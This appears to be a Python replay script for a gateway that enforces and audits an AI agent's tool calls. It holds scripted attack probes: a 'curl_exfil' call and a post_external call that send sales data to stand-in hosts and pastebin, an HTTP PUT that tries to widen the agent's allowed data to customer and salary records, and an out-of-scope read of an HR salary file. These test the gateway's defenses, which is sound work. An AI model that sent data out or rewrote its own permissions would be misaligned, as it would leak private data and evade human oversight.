"""Dashboard replay runner (kit I5): re-plays the demo scenarios' exact
flows against the RUNNING gateway, one subprocess per scenario.

Same execution path as the agent CLI demo: every flow goes through
GatewayClient (agent-side) so each decision is enforced and audited by the
real gateway the dashboard is watching — no second execution or security
path. Scenario F's structural probes (OpenAPI scan, direct tamper attempt)
use raw HTTP exactly as the canonical scenarios/scenario_f.py does; they
prove impossibility and never mutate anything.

Usage: python -m scenarios.replay scenario_e|scenario_f|scenario_g
"""

import os
import sys

import httpx

from taskfence.client import GatewayClient

TASK = "Summarize Q3 sales and post it to #sales."


def _client() -> GatewayClient:
    return GatewayClient(
        base_url=os.environ.get("TASKFENCE_URL", "http://localhost:8000"))


def replay_e() -> None:
    """Scenario E flows, verbatim from scenarios/scenario_e.py: unknown
    tool, unknown destination (destination is fixed by tool metadata), and
    an unknown asset on an otherwise allowed flow — all default-denied."""
    client = _client()
    task_id = client.create_task(TASK)["task_id"]
    unknown_tool = client.call_tool(
        task_id, "curl_exfil", {"url": "https://collect.example.invalid"})
    unknown_dest = client.call_tool(
        task_id, "post_external",
        {"url": "https://collect.example.invalid/ingest", "payload": "x",
         "source_assets": ["sales_report_q3"], "destination": "pastebin"})
    unknown_asset = client.call_tool(
        task_id, "send_slack",
        {"channel": "#sales", "text": "hi",
         "source_assets": ["mystery_asset"]})
    for name, step in (("unknown tool", unknown_tool),
                       ("unknown destination", unknown_dest),
                       ("unknown asset", unknown_asset)):
        print(f"{name}: {step['decision']}")
        if step["decision"] in ("BLOCK", "APPROVE"):
            print(step["agent_message"])


def replay_f() -> None:
    """Scenario F probes, verbatim from scenarios/scenario_f.py: no
    mutating endpoint in the OpenAPI schema, no mutation surface on the
    agent-side client, and a direct tamper attempt that cannot succeed."""
    client = _client()
    task_id = client.create_task(TASK)["task_id"]
    base = client.base_url
    schema = httpx.get(f"{base}/openapi.json", timeout=10).json()
    mutating = [f"{m.upper()} {p}" for p, methods in schema["paths"].items()
                for m in methods
                if m.lower() in ("put", "patch", "delete")]
    surface = [name for name in dir(client) if not name.startswith("_")]
    dangerous = [name for name in surface
                 if "resolve" in name.lower() or "contract" in name.lower()
                 or "approval" in name.lower()]
    attempt = httpx.put(f"{base}/tasks/{task_id}/contract",
                        json={"allowed_data": ["customer_db",
                                               "employee_salary"]},
                        timeout=10)
    print(f"mutating endpoints: {mutating or 'none'}")
    print(f"client mutation surface: {dangerous or 'none'}")
    print(f"PUT /tasks/x/contract -> HTTP {attempt.status_code}")


def replay_g() -> None:
    """Scenario G flows, verbatim from scenarios/scenario_g.py: in-scope
    read, out-of-scope read (allow-but-taint), then the genuinely in-scope
    outbound message — held for human review under conservative lineage
    (the disclosed false positive)."""
    client = _client()
    task_id = client.create_task(TASK)["task_id"]
    first = client.call_tool(task_id, "read_file",
                             {"path": "drive/sales_report_q3.csv"})
    second = client.call_tool(task_id, "read_file",
                              {"path": "hr/employee_salary.csv"})
    outbound = client.call_tool(
        task_id, "send_slack",
        {"channel": "#sales", "text": "Q3: steady growth everywhere.",
         "source_assets": ["sales_report_q3"], "transformation": "summary"})
    print(f"read in-scope: {first['decision']}")
    print(f"read out-of-scope: {second['decision']}")
    print(f"outbound message: {outbound['decision']}")
    if outbound["decision"] in ("BLOCK", "APPROVE"):
        print(outbound["agent_message"])


RUNNERS = {"scenario_e": replay_e, "scenario_f": replay_f,
           "scenario_g": replay_g}


def main() -> None:
    if len(sys.argv) != 2 or sys.argv[1] not in RUNNERS:
        raise SystemExit(
            f"usage: python -m scenarios.replay {'|'.join(sorted(RUNNERS))}")
    RUNNERS[sys.argv[1]]()


if __name__ == "__main__":
    main()
